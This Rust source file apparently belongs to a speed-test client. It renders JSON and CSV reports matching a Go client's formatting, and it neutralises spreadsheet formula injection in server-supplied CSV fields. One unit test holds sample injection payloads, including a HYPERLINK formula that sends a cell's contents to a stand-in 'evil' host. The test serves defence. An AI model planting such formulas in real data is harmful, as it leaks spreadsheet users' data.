//! Machine-readable JSON and CSV reports.

use serde::{Serialize, Serializer};

use crate::defs::IPInfoResponse;

/// Renders a float as Go's `strconv.FormatFloat(v, 'f', -1, 64)` does: the
/// shortest digits that read back as the same number, never an exponent, and
/// no trailing `.0` on a whole one.
///
/// Rust's own `Display` is that same shortest form, and writes negative zero
/// as `-0` the way Go does.
fn plain_float(v: f64) -> String {
    format!("{v}")
}

/// Renders a float the way Go's `encoding/json` writes one.
///
/// Go writes the plain form, and switches to the exponent form only below
/// 1e-6 and from 1e21 -- so a whole number is `555`, not `555.0`, and one too
/// large for that stays spelled out in full rather than becoming `1e+20`. It
/// writes the exponent's sign when the exponent is positive, which Rust does
/// not, and strips a single leading zero from a negative one, which Rust also
/// does not write.
fn go_number(v: f64) -> String {
    let abs = v.abs();
    if abs != 0.0 && !(1e-6..1e21).contains(&abs) {
        let rendered = format!("{v:e}");
        match rendered.split_once('e') {
            Some((mantissa, exponent)) if !exponent.starts_with('-') => {
                format!("{mantissa}e+{exponent}")
            }
            _ => rendered,
        }
    } else {
        plain_float(v)
    }
}

/// Serializes a float into a JSON document the way Go's `encoding/json` does.
///
/// The rendering is handed to serde_json already written, because its own
/// float rendering differs from Go's at both ends of the range.
fn go_float<S: Serializer>(v: &f64, s: S) -> Result<S::Ok, S::Error> {
    // Not reachable from a measurement, which is a rounded finite number, but
    // JSON has no notation for these and Go's encoder refuses them too.
    if !v.is_finite() {
        return Err(serde::ser::Error::custom(format!(
            "{v} cannot be written as JSON"
        )));
    }
    let number = serde_json::value::RawValue::from_string(go_number(*v))
        .map_err(serde::ser::Error::custom)?;
    number.serialize(s)
}

/// Serializes a float into a CSV field the way the Go client's writer does:
/// gocsv formats a `float64` with `strconv.FormatFloat(v, 'f', -1, 64)`, which
/// spells every number out however long it gets.
///
/// Written as a string because a CSV field is text either way; a number needs
/// no quoting, so the field is the digits alone.
fn csv_float<S: Serializer>(v: &f64, s: S) -> Result<S::Ok, S::Error> {
    s.serialize_str(&plain_float(*v))
}

/// One `progress` event of the `--json-stream` NDJSON stream.
///
/// Typed rather than formatted by hand so the numbers are rendered the way
/// Go's `encoding/json` renders them: a whole `mbps` is `100`, not `100.00`,
/// and a consumer decoding into an int does not trip over the difference.
#[derive(Serialize)]
pub struct ProgressEvent {
    pub event: &'static str,
    pub phase: &'static str,
    /// Seconds since the phase's clock started, rounded to one decimal.
    #[serde(serialize_with = "go_float")]
    pub seconds: f64,
    /// The rate measured so far, rounded to two decimals.
    #[serde(serialize_with = "go_float")]
    pub mbps: f64,
    /// Percent of the configured duration elapsed, truncated.
    pub progress: u32,
}

/// Serializes a CSV text field, prefixing a leading formula trigger with a
/// single quote so spreadsheet software treats the value as text.
///
/// The csv writer quotes fields containing the delimiter, a quote or a record
/// terminator, but that is not enough on its own: Excel and LibreOffice strip
/// the quotes and then evaluate anything starting with `=`, `+`, `-`, `@`, TAB
/// or CR. Server names and addresses come off the wire, so a hostile server
/// list can plant a formula that fires when the report is opened.
fn csv_text<S: Serializer>(v: &str, s: S) -> Result<S::Ok, S::Error> {
    if v.starts_with(['=', '+', '-', '@', '\t', '\r']) {
        s.serialize_str(&format!("'{v}"))
    } else {
        s.serialize_str(v)
    }
}

/// Serializes a value as JSON the way Go's `encoding/json` does.
///
/// Go escapes `<`, `>`, `&` and the line separators in every string it
/// marshals -- so that a document can be embedded in HTML or JavaScript
/// without changing meaning -- while serde_json leaves them as they are. A
/// server named `AT&T` is enough to tell the two outputs apart, so the
/// escaping is applied here as well.
///
/// Rewriting the finished document is safe because none of these characters
/// carries structure in JSON: they can only occur inside a string.
pub fn to_go_json<T: Serialize + ?Sized>(value: &T) -> serde_json::Result<String> {
    Ok(escape_like_go(&serde_json::to_string(value)?))
}

fn escape_like_go(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        match c {
            '<' => out.push_str("\\u003c"),
            '>' => out.push_str("\\u003e"),
            '&' => out.push_str("\\u0026"),
            '\u{2028}' => out.push_str("\\u2028"),
            '\u{2029}' => out.push_str("\\u2029"),
            c => out.push(c),
        }
    }
    out
}

/// The current time, formatted the way Go's `time.Time` marshals to JSON.
pub fn timestamp_now() -> String {
    format_timestamp(chrono::Local::now().fixed_offset())
}

/// Formats a timestamp as Go's RFC 3339 "nano" layout does: the fractional
/// second keeps only as many digits as it needs, disappearing entirely when it
/// is zero, and a zero offset is written `Z`.
///
/// Not chrono's `to_rfc3339_opts`, which rounds the fraction to 0, 3, 6 or 9
/// digits and spells a zero offset `+00:00`.
pub fn format_timestamp(t: chrono::DateTime<chrono::FixedOffset>) -> String {
    use chrono::Timelike as _;

    let date = t.format("%Y-%m-%dT%H:%M:%S");

    // A leap second is carried in the nanosecond field as a value past one
    // second; Go has no such representation, so it is folded back in.
    let nanos = t.nanosecond() % 1_000_000_000;
    let fraction = if nanos == 0 {
        String::new()
    } else {
        format!(".{}", format!("{nanos:09}").trim_end_matches('0'))
    };

    let offset = t.offset().local_minus_utc();
    let zone = if offset == 0 {
        "Z".to_string()
    } else {
        // Go truncates the offset to whole minutes and takes the sign from
        // what is left, so an offset less than a minute behind UTC is written
        // as ahead of it.
        let minutes = offset / 60;
        let (sign, minutes) = if minutes < 0 {
            ('-', -minutes)
        } else {
            ('+', minutes)
        };
        format!("{sign}{:02}:{:02}", minutes / 60, minutes % 60)
    };

    format!("{date}{fraction}{zone}")
}

/// The speed test server's information in a JSON report.
#[derive(Debug, Default, Serialize)]
pub struct ReportServer {
    pub name: String,
    pub url: String,
}

/// The speed test client's information in a JSON report.
#[derive(Debug, Default, Serialize)]
pub struct Client {
    #[serde(flatten)]
    pub ip_info: IPInfoResponse,
}

/// The output data fields of a JSON report.
#[derive(Debug, Default, Serialize)]
pub struct JSONReport {
    pub timestamp: String,
    pub server: ReportServer,
    pub client: Client,
    pub bytes_sent: u64,
    pub bytes_received: u64,
    #[serde(serialize_with = "go_float")]
    pub ping: f64,
    #[serde(serialize_with = "go_float")]
    pub jitter: f64,
    #[serde(serialize_with = "go_float")]
    pub upload: f64,
    #[serde(serialize_with = "go_float")]
    pub download: f64,
    pub share: String,

    /// What the connection to the server negotiated, absent over plain HTTP.
    /// On hardware without AES acceleration the cipher, not the link, can
    /// bound the result, and under TLS 1.3 the server picks it -- so two
    /// otherwise identical runs can differ several-fold for a reason the
    /// numbers alone do not show.
    ///
    /// Read from the backend probe, as the Go client reads it: the transfer
    /// phases open further connections, which a server is free to negotiate
    /// differently.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub tls: Option<TLSReport>,
}

/// The negotiated TLS parameters a measurement ran over.
#[derive(Debug, Serialize)]
pub struct TLSReport {
    pub version: String,
    pub cipher: String,
}

/// The output data fields of a CSV report.
#[derive(Debug, Default, Serialize)]
pub struct CSVReport {
    #[serde(rename = "Timestamp")]
    pub timestamp: String,
    #[serde(rename = "Server Name", serialize_with = "csv_text")]
    pub name: String,
    #[serde(rename = "Address", serialize_with = "csv_text")]
    pub address: String,
    #[serde(rename = "Ping", serialize_with = "csv_float")]
    pub ping: f64,
    #[serde(rename = "Jitter", serialize_with = "csv_float")]
    pub jitter: f64,
    #[serde(rename = "Download", serialize_with = "csv_float")]
    pub download: f64,
    #[serde(rename = "Upload", serialize_with = "csv_float")]
    pub upload: f64,
    #[serde(rename = "Share", serialize_with = "csv_text")]
    pub share: String,
    #[serde(rename = "IP", serialize_with = "csv_text")]
    pub ip: String,
}

/// The CSV column names, in order.
pub const CSV_HEADERS: [&str; 9] = [
    "Timestamp",
    "Server Name",
    "Address",
    "Ping",
    "Jitter",
    "Download",
    "Upload",
    "Share",
    "IP",
];

fn writer(delimiter: u8) -> csv::Writer<Vec<u8>> {
    csv::WriterBuilder::new()
        .delimiter(delimiter)
        .from_writer(Vec::new())
}

/// Renders just the CSV header row, for `--csv-header`.
pub fn csv_header(delimiter: u8) -> anyhow::Result<String> {
    let mut w = writer(delimiter);
    w.write_record(CSV_HEADERS)?;
    Ok(String::from_utf8(w.into_inner()?)?)
}

/// Renders CSV rows without a header, terminated by exactly one newline.
///
/// The line endings the writer produced are normalised away first, so the
/// result is one newline whatever the writer emitted. `--csv-header` ends with
/// one too, which is what lets the two modes be concatenated into a file a CSV
/// reader will accept.
pub fn csv_rows(reports: &[CSVReport], delimiter: u8) -> anyhow::Result<String> {
    let mut w = csv::WriterBuilder::new()
        .delimiter(delimiter)
        .has_headers(false)
        .from_writer(Vec::new());

    for rep in reports {
        w.serialize(rep)?;
    }

    let out = String::from_utf8(w.into_inner()?)?;
    Ok(format!("{}\n", out.trim_end_matches(['\n', '\r'])))
}

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::{TimeZone as _, Timelike as _};

    fn at(nanos: u32, offset_seconds: i32) -> chrono::DateTime<chrono::FixedOffset> {
        chrono::FixedOffset::east_opt(offset_seconds)
            .unwrap()
            .with_ymd_and_hms(2026, 8, 6, 15, 41, 36)
            .unwrap()
            .with_nanosecond(nanos)
            .unwrap()
    }

    #[test]
    fn header_uses_the_configured_delimiter() {
        assert_eq!(
            csv_header(b',').unwrap().trim_end(),
            "Timestamp,Server Name,Address,Ping,Jitter,Download,Upload,Share,IP"
        );
        assert_eq!(
            csv_header(b';').unwrap().trim_end(),
            "Timestamp;Server Name;Address;Ping;Jitter;Download;Upload;Share;IP"
        );
    }

    #[test]
    fn rows_quote_embedded_delimiters_and_end_with_one_newline() {
        let rep = CSVReport {
            timestamp: "2026-08-06T15:41:36.067293+02:00".into(),
            name: "Prague, Czech Republic (CESNET)".into(),
            address: "https://speedtest.cesnet.cz".into(),
            ping: 6.36,
            jitter: 0.82,
            download: 228.39,
            upload: 553.97,
            ..Default::default()
        };
        let out = csv_rows(&[rep], b',').unwrap();
        assert_eq!(
            out,
            "2026-08-06T15:41:36.067293+02:00,\"Prague, Czech Republic (CESNET)\",https://speedtest.cesnet.cz,6.36,0.82,228.39,553.97,,\n"
        );
    }

    #[test]
    fn rows_defuse_spreadsheet_formulas_in_server_supplied_fields() {
        let rep = CSVReport {
            timestamp: "2026-08-06T15:41:36.067293+02:00".into(),
            name: "=HYPERLINK(\"http://evil/?x=\"&A1,\"Result\")".into(),
            address: "@SUM(1+1)".into(),
            share: "-2+3".into(),
            ip: "\t=cmd".into(),
            ..Default::default()
        };
        let out = csv_rows(&[rep], b',').unwrap();
        // Every attacker-controlled field is prefixed, so nothing evaluates.
        assert!(out.contains("\"'=HYPERLINK(\"\"http://evil/?x=\"\"&A1,\"\"Result\"\")\""));
        assert!(out.contains(",'@SUM(1+1),"));
        assert!(out.contains(",'-2+3,"));
        // A TAB needs no CSV quoting under a ',' delimiter, so the prefix on
        // its own is what stops the evaluation here.
        assert!(out.ends_with(",'\t=cmd\n"));
        // A benign value is untouched.
        assert!(!csv_rows(
            &[CSVReport {
                name: "CESNET".into(),
                ..Default::default()
            }],
            b','
        )
        .unwrap()
        .contains('\''));
    }

    #[test]
    fn timestamps_trim_the_fraction_the_way_go_does() {
        assert_eq!(
            format_timestamp(at(411_388_000, 7200)),
            "2026-08-06T15:41:36.411388+02:00"
        );
        assert_eq!(
            format_timestamp(at(380_000_000, 7200)),
            "2026-08-06T15:41:36.38+02:00"
        );
        assert_eq!(format_timestamp(at(0, 7200)), "2026-08-06T15:41:36+02:00");
        assert_eq!(
            format_timestamp(at(1, 7200)),
            "2026-08-06T15:41:36.000000001+02:00"
        );
    }

    #[test]
    fn a_zero_offset_is_written_z() {
        assert_eq!(
            format_timestamp(at(20_091_000, 0)),
            "2026-08-06T15:41:36.020091Z"
        );
        assert_eq!(
            format_timestamp(at(0, -19_800)),
            "2026-08-06T15:41:36-05:30"
        );
    }

    #[test]
    fn json_escapes_what_go_escapes() {
        let report = JSONReport {
            server: ReportServer {
                name: "AT&T <Lab>".into(),
                url: "http://x/?a=1&b=2".into(),
            },
            ..Default::default()
        };
        let out = to_go_json(&[report]).unwrap();
        assert!(
            out.contains(r#""name":"AT\u0026T \u003cLab\u003e""#),
            "{out}"
        );
        assert!(out.contains(r#""url":"http://x/?a=1\u0026b=2""#), "{out}");
    }
}
